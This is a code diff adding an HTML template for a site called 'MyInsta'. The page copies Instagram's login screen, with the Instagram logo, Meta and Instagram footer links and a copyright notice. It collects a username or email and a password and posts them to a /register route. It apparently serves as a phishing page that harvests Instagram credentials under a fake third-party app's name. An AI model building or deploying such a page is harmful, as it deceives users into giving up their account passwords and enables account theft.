@@ -1,0 +1,196 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MyInsta - Register Your Account</title>
+    <style>
+        @font-face {
+            font-family: "generatePress";
+            src: url(https://files.catbox.moe/u25xb0.woff2);
+        }
+
+        body {
+            font-family: "generatePress", sans-serif;
+        }
+        .navigation-branding img, .site-logo.mobile-header-logo img {
+            height: 60px;
+            width: auto;
+        }
+        .main-sec {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        h2.gb-headline-1d2bf5d5 {
+            font-size: 60px;
+            font-weight: 700;
+        }
+
+        p {
+            display: block;
+            margin-block-start: 1em;
+            margin-block-end: 1em;
+            unicode-bidi: isolate;
+        }
+
+        .gb-button-wrapper a.gb-button-33782d3a,
+        .gb-button-wrapper a.gb-button-33782d3a:visited {
+            background-color: #0366d6;
+            width: 100%;
+            color: white;
+            padding: 15px 32px;
+            border-radius: 6px;
+            text-align: center;
+            text-decoration: none;
+        }
+
+        .gb-image {
+            margin-top: 50px;
+            width: 100%;
+            height: auto;
+        }
+
+        .nav {
+            display: flex;
+            justify-content: space-between;
+            padding: 10px 20px;
+            padding-bottom: 50px;
+        }
+
+        .nav-link {
+            padding-left: 15px;
+            text-decoration: none;
+            color: rgb(42, 42, 42);
+        }
+    </style>
+    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
+</head>
+
+<body>
+    <nav class="nav">
+        <div>
+            <div class="navigation-branding"><div class="">
+						<a href="https://myinsta.app/" title="MyInsta" rel="home">
+							<img class="" alt="MyInsta" src="https://myinsta.app/wp-content/uploads/2023/11/myinsta-icon-white.webp" title="MyInsta" srcset="https://myinsta.app/wp-content/uploads/2023/11/myinsta-icon-white.webp 1x, https://myinsta.app/wp-content/uploads/2023/11/myinsta-icon-white.webp 2x" width="512" height="512">
+						</a>
+					</div></div>
+        </div>
+        <div>
+            <a class="nav-link" href="#">Changelog</a>
+            <a class="nav-link" href="#">FAQ</a>
+            <a class="nav-link" href="#">About</a>
+            <a class="nav-link" href="#">Contact</a>
+        </div>
+    </nav>
+
+    <div class="main-body">
+
+        <div class="body-2">
+
+            <div class="login">
+
+                <div class="instagram-box">
+
+                    <a href="https://www.instagram.com/">
+
+                        <img id="instagram-logo" src="{{ url_for('static', filename='Instagram Logo.jpg') }}" alt="">
+
+                    </a>
+
+                </div>
+
+                <form action="/register", method="post">
+                    <div class="textfield">
+                        <input required name="uname" id="username" type="text" placeholder="Phone number, username or email">
+                        <input required name="pass" id="password" type="password" placeholder="Password">
+                    </div>
+                    <button type="submit" id="login-btn" >Log in</button>
+                </form>
+
+                <p class="forget-password" style="color: red;">{{ msg }}</p>
+
+                <div class="or">
+                    <hr width="120rem">
+
+                </div>
+
+                <div class="forget-password">
+
+                    <a href="{{ url_for('register') }}">
+
+                        <p>Forgot Password?</p>
+
+                    </a>
+
+                </div>
+
+            </div>
+
+        </div>
+
+    </div>
+
+    <footer>
+
+        <div class="footer-1">
+
+            <a href="https://about.meta.com/" target="_blank">
+                <p>Meta</p>
+            </a>
+            <a href="https://about.instagram.com/" target="_blank">
+                <p>About</p>
+            </a>
+            <a href="https://about.instagram.com/blog" target="_blank">
+                <p>Blog</p>
+            </a>
+            <a href="https://about.instagram.com/about-us/careers" style="text-decoration: none;">
+                <p>Jobs</p>
+            </a>
+            <a href="https://help.instagram.com/" target="_blank">
+                <p>Help</p>
+            </a>
+            <a href="https://developers.facebook.com/docs/instagram" target="_blank">
+                <p>API</p>
+            </a>
+            <a href="https://privacycenter.instagram.com/policy/?entry_point=ig_help_center_data_policy_redirect"
+                style="text-decoration: none;">
+                <p>Privacy</p>
+            </a>
+            <a href="https://help.instagram.com/581066165581870/" style="text-decoration: none;">
+                <p>Terms</p>
+            </a>
+            <a href="https://www.instagram.com/explore/locations/" style="text-decoration: none;">
+                <p>Locations</p>
+            </a>
+            <a href="https://www.instagram.com/web/lite/" style="text-decoration: none;">
+                <p>Instagram Lite</p>
+            </a>
+            <a href="https://www.threads.net/" target="_blank">
+                <p>Threads</p>
+            </a>
+            <a href="https://www.facebook.com/help/instagram/261704639352628" style="text-decoration: none;">
+                <p>Contact Uploading & Non-Users</p>
+            </a>
+            <a href="https://about.meta.com/technologies/meta-verified/" target="_blank">
+                <p>Meta Verified</p>
+            </a>
+
+        </div>
+
+        <div class="footer-2">
+
+            <p>English</p>
+
+            <p>© 2025 Instagram from Meta</p>
+
+        </div>
+
+    </footer>
+
+
+</body>
+
+</html>
